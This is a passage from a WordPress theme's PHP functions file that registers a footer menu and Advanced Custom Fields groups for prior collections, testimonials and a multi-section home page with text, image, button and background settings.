        'tpc-footer-menu-3' => __('Footer Menu 3', 'html5blank')
    ));
}
add_action('init', 'register_footer_menu'); // Add HTML5 Blank Menu

/*------------------------------------*\
    Custom Field
\*------------------------------------*/

if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_prior-collections',
        'title' => 'Prior Collections',
        'fields' => array (
            array (
                'key' => 'field_59e62a1f65e36',
                'label' => 'Image',
                'name' => 'image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'prior_collections',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
            ),
        ),
        'menu_order' => 0,
    ));
}

if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_testimonies',
        'title' => 'Testimonies',
        'fields' => array (
            array (
                'key' => 'field_59e7bcb90734d',
                'label' => 'Image',
                'name' => 'image',
                'type' => 'image',
                'required' => 1,
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a0eecd3274b7',
                'label' => 'Testimonies text box',
                'name' => 'testimonies-text-box',
                'type' => 'textarea',
                'instructions' => 'i.e. [bold_pink]lorem ipsum[/bold_pink]',
                'required' => 1,
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59e7bce30734e',
                'label' => 'Number of stars',
                'name' => 'number_of_stars',
                'type' => 'select',
                'choices' => array (
                    5 => 5,
                    4 => 4,
                    3 => 3,
                    2 => 2,
                    1 => 1,
                ),
                'default_value' => '',
                'allow_null' => 0,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59e7bf521b543',
                'label' => 'Date of testimony',
                'name' => 'date_of_testimony',
                'type' => 'text',
                'required' => 1,
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'tpc_testimonials',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
            ),
        ),
        'menu_order' => 0,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_home',
        'title' => 'HOME',
        'fields' => array (
            array (
                'key' => 'field_59f9e189e151f',
                'label' => 'Top bar header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59f9e999fcdf0',
                'label' => 'Column content 1',
                'name' => 'column_content_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9e9e1fcdf1',
                'label' => 'Column content 2',
                'name' => 'column_content_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9e9e9fcdf2',
                'label' => 'Column content 3',
                'name' => 'column_content_3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9e9f0fcdf3',
                'label' => 'Session 1',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59f9ea5efcdf6',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_59f9ea0ffcdf4',
                'label' => 'Video',
                'name' => 'video',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_59f9ea44fcdf5',
                'label' => 'Content text',
                'name' => 'content_text_s1',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9ec14fcdf7',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_59f9ec4204d32',
                'label' => 'Image',
                'name' => 'image_s1',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59f9ed2304d34',
                'label' => 'Link button',
                'name' => 'link_button_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9ecdb04d33',
                'label' => 'Button text',
                'name' => 'button_text_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa3c1012d04',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa3c1112d0a',
                'label' => 'Background Color',
                'name' => 'background_color_s1',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa3c1112d09',
                'label' => 'Background Image',
                'name' => 'background_image_s1',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa3c1112d08',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s1',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa3c1012d07',
                'label' => 'Background Position',
                'name' => 'background_position_s1',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa3c1012d06',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s1',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa3c1012d05',
                'label' => 'Background Size',
                'name' => 'background_size_s1',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59f9ed5304d35',
                'label' => 'Session 2',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59f9ed93140d3',
                'label' => 'Title',
                'name' => 'title_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9edcd140d4',
                'label' => 'Subtitle',
                'name' => 'subtitle_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9ed6404d36',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_59f9ee80140d7',
                'label' => 'Title',
                'name' => 'title_c1_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9ef5a140db',
                'label' => 'Content Text',
                'name' => 'content_text_c1_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9ed7004d37',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_59f9ee85140d8',
                'label' => 'Title',
                'name' => 'title_c2_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9efd1140dc',
                'label' => 'Content Text',
                'name' => 'content_text_c2_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9ee2a140d5',
                'label' => 'Third column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_59f9ee8a140d9',
                'label' => 'Title',
                'name' => 'title_c3_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9efd5140dd',
                'label' => 'Content Text',
                'name' => 'content_text_c3_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9ee6a140d6',
                'label' => 'Fourth column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Fourth column</strong></p>',
            ),
            array (
                'key' => 'field_59f9ee8e140da',
                'label' => 'Title',
                'name' => 'title_c4_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9efda140de',
                'label' => 'Content Text',
                'name' => 'content_text_c4_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fa3c1012d03',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa3c1012d02',
                'label' => 'Background Color',
                'name' => 'background_color_s2',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa3c09bb8a6',
                'label' => 'Background Image',
                'name' => 'background_image_s2',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa3c09bb8a4',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s2',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa3c09bb8a3',
                'label' => 'Background Position',
                'name' => 'background_position_s2',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa3c09bb8a2',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s2',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa3c08bb8a1',
                'label' => 'Background Size',
                'name' => 'background_size_s2',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59f9f97b49cfd',
                'label' => 'Session 3',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59f9f97b49cfe',
                'label' => 'Title',
                'name' => 'title_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9f97c49d00',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_59f9f97d49d01',
                'label' => 'Title',
                'name' => 'title_c1_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9f95949cf6',
                'label' => 'Content Text',
                'name' => 'content_text_c1_s3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9f95d49cf7',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_59f9f96349cf8',
                'label' => 'Title',
                'name' => 'title_c2_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9f96949cf9',
                'label' => 'Content Text',
                'name' => 'content_text_c2_s3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9f96c49cfa',
                'label' => 'Third column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_59f9f97149cfb',
                'label' => 'Title',
                'name' => 'title_c3_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9f97749cfc',
                'label' => 'Content Text',
                'name' => 'content_text_c3_s3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fa3c08bb8a0',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa3c08bb89f',
                'label' => 'Background Color',
                'name' => 'background_color_s3',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa3c07bb89e',
                'label' => 'Background Image',
                'name' => 'background_image_s3',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa3c07bb89d',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s3',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4678c9197',
                'label' => 'Background Position',
                'name' => 'background_position_s3',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4685c91c7',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s3',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4685c91c6',
                'label' => 'Background Size',
                'name' => 'background_size_s3',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59f9fd48c9031',
                'label' => 'Session 4',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a009f95f6e3e',
                'label' => 'Images of desktop',
                'name' => 'image_s4',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172aee777f2',
                'label' => 'Mobile image',
                'name' => 'image_mobile_s4',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59f9fd51c903d',
                'label' => 'Link button',
                'name' => 'link_button_s4',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9fd51c903c',
                'label' => 'Button text',
                'name' => 'button_text_s4',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa4684c91c5',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa4684c91c4',
                'label' => 'Background Color',
                'name' => 'background_color_s4',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa4684c91c3',
                'label' => 'Background Image',
                'name' => 'background_image_s4',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa4684c91c2',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s4',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4684c91c1',
                'label' => 'Background Position',
                'name' => 'background_position_s4',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4684c91c0',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s4',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4683c91bf',
                'label' => 'Background Size',
                'name' => 'background_size_s4',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59f9fd51c903b',
                'label' => 'Session 5',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59f9fd50c903a',
                'label' => 'Title',
                'name' => 'title_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9fd4fc9039',
                'label' => 'Subtitle',
                'name' => 'subtitle_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9fd4fc9038',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_59fa0409ce299',
                'label' => 'Image',
                'name' => 'image_c1_s5',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59f9fd4ec9037',
                'label' => 'Title',
                'name' => 'title_c1_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9fd4ec9036',
                'label' => 'Content Text',
                'name' => 'content_text_c1_s5',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9fd4ec9035',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_59fa0409ce29a',
                'label' => 'Image',
                'name' => 'image_c2_s5',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59f9fd4ec9034',
                'label' => 'Title',
                'name' => 'title_c2_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59f9fd4dc9033',
                'label' => 'Content Text',
                'name' => 'content_text_c2_s5',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59f9fd4dc9032',
                'label' => 'Third column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_59fa0409ce297',
                'label' => 'Image',
                'name' => 'image_c3_s5',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa0401ce28b',
                'label' => 'Title',
                'name' => 'title_c3_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa0409ce29b',
                'label' => 'Content Text',
                'name' => 'content_text_c3_s5',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fa0406ce28e',
                'label' => 'Button',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Button</strong></p>',
            ),
            array (
                'key' => 'field_59fa0406ce290',
                'label' => 'Link button',
                'name' => 'link_button_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa0406ce28f',
                'label' => 'Button text',
                'name' => 'button_text_s5',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa4683c91be',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa4683c91bd',
                'label' => 'Background Color',
                'name' => 'background_color_s5',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa4683c91bc',
                'label' => 'Background Image',
                'name' => 'background_image_s5',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa4683c91bb',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s5',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4683c91ba',
                'label' => 'Background Position',
                'name' => 'background_position_s5',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4682c91b9',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s5',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4682c91b8',
                'label' => 'Background Size',
                'name' => 'background_size_s5',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa0408ce296',
                'label' => 'Session 6',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fa0407ce295',
                'label' => 'Title',
                'name' => 'title_s6',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa0407ce294',
                'label' => 'Subtitle',
                'name' => 'subtitle_s6',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa23fd81bfc',
                'label' => 'Prior collections carousel category',
                'name' => 'prior_collections_carousel_category',
                'type' => 'taxonomy',
                'taxonomy' => 'category',
                'field_type' => 'select',
                'allow_null' => 0,
                'load_save_terms' => 0,
                'return_format' => 'object',
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa0406ce28d',
                'label' => 'Button',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Button</strong></p>',
            ),
            array (
                'key' => 'field_59fa0406ce28c',
                'label' => 'Link button',
                'name' => 'link_button_s6',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa3c02bb89c',
                'label' => 'Button text',
                'name' => 'button_text_s6',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa4682c91b7',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa4682c91b6',
                'label' => 'Background Color',
                'name' => 'background_color_s6',
                'type' => 'color_picker',
